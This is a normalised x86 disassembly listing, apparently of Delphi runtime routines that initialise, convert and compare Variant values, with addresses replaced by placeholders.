fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409a04
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404978
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409a04
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404978
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_4128cc
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404868
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412904
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404868
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_40493c
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a28
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_41293c
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404868
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404978
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404978
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404978
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4086ac
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404978
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_4086ac
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404978
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4132dc
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_4130f8
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404868
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413835
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404844
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_404144
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404844
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_404144
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404844
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_404144
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404844
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404144
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4131b0
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404868
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404978
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40edec
test ah 0x40
je r-xdata
mov eax esi
call sub_40482c
mov edx eax
mov eax ebx
call sub_413214
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4130f8
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404868
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4130f8
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404868
jmp r-xdata
jmp [ eax * 4 + jump_table_41359d ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404978
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404978
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409a04
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404978
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409a04
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404978
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_4128cc
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404868
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412904
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404868
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40493c
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_41293c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404868
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404978
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404978
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4085c0
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404978
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_4086ac
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404978
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_4086ac
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404978
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4132dc
jmp r-xdata
sub_41383c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4138a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f94c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_405b68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4138ad
lea eax [ ebp - 0x10 ]
call sub_40f624
retn
mov dx 0xd
mov ax 0x101
call sub_40edec
sub_4138b4
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_41383c
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405b68
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405b68
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405b50
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41670c
test al al
je r-xdata
mov eax esi
call sub_405b50
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40edec
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40edec
mov eax esi
call sub_405b50
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403444
test al al
jne r-xdata
sub_413980
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405b50
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405b50
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40edec
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405b68
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405b68
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41670c
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40edec
mov eax esi
call sub_405b50
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403444
test al al
jne r-xdata
sub_413a2c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f5a8
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_413a68
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f5a8
sub_413a88
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f5a8
sub_413aa8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f5a8
sub_413ac8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f5a8
sub_413ae8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f5a8
sub_413b08
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f5a8
sub_413b28
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f5a8
sub_413b54
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f5a8
sub_413b78
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f5a8
sub_413ba4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f5a8
sub_413bd0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f5a8
sub_413bfc
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f5a8
sub_413c60
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404174
pop esi
pop ebx
retn
mov eax ebx
call sub_40f5a8
sub_413c8c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413ccf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404384
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413c60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413cd6
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_413cdc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404a28
pop esi
pop ebx
retn
mov eax ebx
call sub_40f5a8
sub_413d14
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405b68
pop esi
pop ebx
retn
mov eax ebx
call sub_40f5a8
sub_413d40
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405b68
pop esi
pop ebx
retn
mov eax ebx
call sub_40f5a8
sub_413d6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413daf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404978
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413cdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413db6
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
sub_413dbc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413e12
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f94c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413e19
lea eax [ ebp - 0x10 ]
call sub_40f624
retn
sub_413e28
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ ebx ] 0x400c
jne r-xdata
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_413e28
jmp r-xdata
mov di [ ebx ]
movzx eax di
cmp eax 0x14
jg r-xdata
mov eax esi
call sub_40f5a8
pop edx
pop edi
pop esi
pop ebx
retn
sub eax 0x100
je r-xdata
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_413d6c
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
mov edx ebx
mov eax esi
call sub_413dbc
jmp r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebx + 0x8 ] 0x7fffffff
ja r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fe90
jmp r-xdata
je r-xdata
test di 0x2000
je r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40fe90
jmp r-xdata
cmp [ ebx + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
test [ ebx + 0xb ] 0x80
je r-xdata
jmp r-xdata
mov eax edi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov ecx sub_413e20
mov edx ebx
mov eax esi
call sub_40f6cc
jmp r-xdata
jl r-xdata
cmp [ ebx + 0x8 ] 0x80000000
jb r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fe90
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40fe90
jmp r-xdata
mov edx esp
mov eax edi
call sub_41670c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f94c
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fe90
jmp r-xdata
jmp r-xdata
call sub_40ed98
mov ecx ebx
mov edx esi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
sub_413f78
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40ee88
mov bx 0x8
jmp r-xdata
sub_413f9c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41405f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f94c
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_414850
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414066
lea eax [ ebp - 0x11 ]
call sub_40f624
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_414033
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f94c
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_414850
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40f624
retn
sub_414084
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40eedc
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40eedc
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40eedc
jmp r-xdata
je r-xdata
call sub_40ee88
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_414180
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_4141bc
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4141e4
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_41420c
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_414238
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_414293
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_412bb4
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412bb4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408180
xor edx edx
call sub_41416c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41429a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
sub_4142a4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_413f78
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_413f78
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40ee88
mov al 0x1
jmp [ edx * 4 + jump_table_4142f5 ]
call sub_40ee88
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_414070
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_414084
jmp r-xdata
mov eax edi
call sub_410254
push eax
mov eax esi
call sub_410254
pop edx
call sub_41416c
jmp r-xdata
mov eax esi
call sub_410d18
push edx
push eax
mov eax edi
call sub_410d18
push edx
push eax
call sub_414180
jmp r-xdata
mov eax esi
call sub_411828
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411828
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_4141bc
jmp r-xdata
mov eax esi
call sub_411f98
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411f98
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_4141e4
jmp r-xdata
mov eax esi
call sub_412500
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_412500
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_41420c
jmp r-xdata
mov edx edi
mov eax esi
call sub_414238
jmp r-xdata
mov eax edi
call sub_411314
and eax 0x7f
push eax
mov eax esi
call sub_411314
and eax 0x7f
pop edx
call sub_41416c
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_413f9c
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414430
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_414070
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_414070
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_41670c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_414084
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_41670c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_414084
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40ee88
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40ee88
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4145c9
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40fe90
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_41670c
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41475b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40fe90
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4146b9
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40fe90
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_4142a4
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f624
retn
call sub_40ed98
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41453b
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40fe90
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
